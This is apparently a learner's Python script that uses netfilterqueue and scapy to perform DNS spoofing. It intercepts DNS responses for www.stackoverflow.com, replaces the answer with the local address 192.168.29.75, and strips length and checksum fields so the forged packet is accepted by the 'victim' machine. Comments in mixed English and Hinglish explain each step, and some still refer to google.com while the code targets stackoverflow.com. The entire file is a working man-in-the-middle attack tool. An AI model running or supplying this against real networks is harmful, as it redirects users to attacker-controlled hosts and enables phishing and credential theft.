# SPOOFING (STACK OVERFLOW)

# STEP 1 : intercept the packets
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    # now convert packet into a scapy packet so that we can use scapy functions on it, and import scapy module also
    scapy_packet = scapy.IP(packet.get_payload())       # now our packet has been converted to scapy packet, so we can use scapy functions on it
    if scapy_packet.haslayer(scapy.DNSRR):              # now filtering DNS response packets so that we can spoof our target
        #  since we want to spoof only google.com so we will filter DNS response packets of google.com only so we will compare qname of every packet with this string "www.google.com"
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.stackoverflow.com" in qname.decode():      # this will filter only those google's DNS response packets
            # now we need to change the response packet , so we need to make an answer packet
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.29.75")
            # since we have created our answer packet, so we need to update the scapy_packet with our answer
            scapy_packet[scapy.DNS].an = answer

            scapy_packet[scapy.DNS].ancount = 1

            # now we are deleting some fields of our packets which may corrupt our packet because:-
            # (e.g.) jb google ne answer send kiya, tw usne packet p likh diya tha ki bhai answer me 76 characters hai, pr ab appanne answer change kr diya hai, maybe apne
            # answer me 50 character ho, so victim ka computer smaj jayega ki bhai packet m tw 76 character like hue hai pr answer me tw keval 50 hi hai means kisine answer
            # change kiye hai so it will declare packet as corrupted, so we are deleting that field

            # also agar koi packet miss ho jayega tw, vo checksum ke through vapas aayega, Now checksum se jo packet aayega vo google se aayega becaue usme google ka address hai
            # so jb vo vapas aayega tw usme 76 characters honge , now victim machine will be confused that abhi tw mere answer me 50 characters aa rhe the ab 76 kese aa gye
            # so again it will declare it corrupted, so we will delete checksum field also

            # now when we delete check sum field and send packet an another ckecksum field will be declared with our address (so iski apanko tension nhi leni hai)

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # till now we have changed response, and we have removed all cases in which our packet may be declaerd as corrupted
            # all changes which we have made till now were on scapy packet but the original packet which we received is "packet" so we need to reflect those changes in
            # this packet as well
            packet.set_payload(bytes(scapy_packet))

            print(scapy_packet.show())
    packet.accept()

# now we need to access the captured packet in queue, so we will make an object of class NetfilterQueue to intercept that captured packet , we will bind queue num 0 and will call a process_packet callback function for it
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
